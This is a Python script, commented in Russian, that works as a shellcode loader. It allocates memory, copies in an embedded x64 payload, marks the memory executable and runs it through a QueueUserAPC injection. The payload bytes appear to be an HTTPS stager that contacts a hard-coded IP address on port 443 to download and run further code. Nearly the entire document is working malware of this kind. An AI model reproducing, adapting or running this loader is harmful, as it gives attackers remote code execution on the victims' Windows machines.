import ctypes
from ctypes import wintypes
import platform
import logging
import time

# Настройка логгирования
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def execute_shellcode():

    logger.info("Начало выполнения скрипта")
    
    # Определение функций WinAPI
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.restype = wintypes.LPVOID
    VirtualAlloc.argtypes = (wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD)
    
    RtlMoveMemory = ctypes.memmove
    
    
    VirtualProtect = kernel32.VirtualProtect
    VirtualProtect.restype = wintypes.BOOL
    VirtualProtect.argtypes = (wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD))
    
    CreateThread = kernel32.CreateThread
    CreateThread.restype = wintypes.HANDLE
    CreateThread.argtypes = (wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
    
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.restype = wintypes.DWORD
    WaitForSingleObject.argtypes = (wintypes.HANDLE, wintypes.DWORD)
    
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    INFINITE = 0xFFFFFFFF
    
    GetCurrentThread = kernel32.GetCurrentThread
    GetCurrentThread.restype = wintypes.HANDLE
    
    if platform.architecture()[0] == '64bit':
        ULONG_PTR = ctypes.c_ulonglong
    else:
        ULONG_PTR = ctypes.c_ulong
    
    QueueUserAPC = kernel32.QueueUserAPC
    QueueUserAPC.restype = wintypes.DWORD
    QueueUserAPC.argtypes = [wintypes.LPVOID, wintypes.HANDLE, ULONG_PTR]
    
    
    logger.debug("Функции WinAPI определены")
    
    # Shellcode
    payload = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x6c\x36\x6a\x51\x00\x26\x94\x01\x7e\xc3\x55\xf8\xcf\x36\x38\x0d\x1b\x23\x17\xad\x75\x18\x01\x12\x69\xcf\x49\x36\xf5\x81\x24\xdb\x4d\x33\x4b\x15\x59\x13\xa4\xb6\xd6\xdc\x21\xd3\x4e\x6c\xe6\xe7\x08\x31\x84\xe3\x35\x55\x52\x95\xb3\x37\xe4\x81\x44\x7c\xc9\x0d\x57\x07\xcd\xb2\x73\xfb\xf4\xdc\x2f\xb7\x43\x59\x96\x91\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\x9f\xe0\xd1\xc2\xf4\x1d\xd3\x12\x0c\xcb\x05\xbc\xe3\x12\xa5\x00\x71\xec\xfe\x05\xe8\xa7\xb6\x50\x57\xbc\xb9\x7f\x75\x7e\xa9\x25\x4c\x72\x12\x8a\xc6\x58\x26\x2d\xdc\x9b\x1b\xc3\x03\x3a\x32\x25\xc0\x4f\x56\x4a\xdd\x6c\x33\xd1\xae\x50\xe0\x1d\xc3\x50\x4d\x91\xcb\xd4\x38\x92\x4d\xae\xe7\x7a\xf9\xf0\xb3\x82\x90\x37\x75\x5e\x39\x5b\x6e\x57\x6f\x66\x26\x89\x52\x72\xe1\x6a\x9b\x83\x10\x8c\xcc\x0d\xac\xcf\xb0\x61\x53\xa3\xdc\xc3\x56\x1a\x0a\x5d\x5e\x44\xb9\xe0\xea\x85\xe6\x07\x29\x03\x7f\xa9\x6a\x78\xf9\x07\xc5\x57\x16\xa7\xcb\xe6\xd5\x32\x87\x51\x46\x08\xbb\xcc\xba\x6b\x52\x40\x89\x73\xec\x1f\xb7\xfa\x53\x61\xda\x2a\xca\x0e\x1d\xd0\x10\x67\x2f\x59\x79\xa0\x37\x7c\x7c\x66\x0b\x6b\xd7\x67\xda\x63\xf8\xf5\x1c\xba\x71\x5a\xe0\xf9\x7b\xcf\x68\x29\x09\x47\xa6\xe6\x34\xbe\xd0\xc2\xd4\xc0\xd5\x9e\x1e\x83\xc8\x08\x02\xf0\x47\x91\x38\xd3\xbc\x83\xde\xe8\x72\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x36\x39\x2e\x32\x35\x34\x2e\x31\x37\x30\x2e\x31\x35\x35\x00\x28\x2d\x41\x56"
    )
    payload_len = len(payload)
    
    logger.debug("Shellcode подготовлен")
    
    # Выделение памяти под shellcode
    exec = VirtualAlloc(None, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if exec is not None:
        logger.info("Память успешно выделена")
    else:
        logger.error("Ошибка выделения памяти")
    
    # Копирование shellcode в выделенную память
    RtlMoveMemory(exec, payload, payload_len)
    logger.info("Shellcode скопирован в выделенную память")
    
    # Изменение прав доступа к памяти на выполнение
    oldprotect = wintypes.DWORD()
    if VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, ctypes.byref(oldprotect)):
        logger.info("Права доступа к памяти изменены на выполнение")
    else:
        logger.error("Ошибка изменения прав доступа к памяти")
    
    # Получение дескриптора текущего потока
    current_thread_handle = GetCurrentThread()
    logger.info("Дескриптор текущего потока получен")
    
    # Добавление APC к очереди текущего потока
    if QueueUserAPC(exec, current_thread_handle, 0):
        logger.info("APC добавлен к очереди текущего потока")
    else:
        logger.error("Ошибка добавления APC к очереди потока")
    
    
    # Функция SleepEx из kernel32
    SleepEx = kernel32.SleepEx
    SleepEx.argtypes = [ctypes.c_ulong, ctypes.c_bool]
    SleepEx.restype = ctypes.c_ulong
    
    # Вход в оповещаемое состояние ожидания
    logger.info("Вход в оповещаемое состояние ожидания")
    SleepEx(3000, True)  # Ожидание 5000 мс (5 секунд) в оповещаемом режиме
    logger.info("Выход из оповещаемого состояния ожидания")
    
    logger.info("Завершение выполнения скрипта")


def main():
    try:
        execute_shellcode()
    except Exception as e:
        logger.error(f"Произошла ошибка: {e}")

if __name__ == "__main__":
    main()
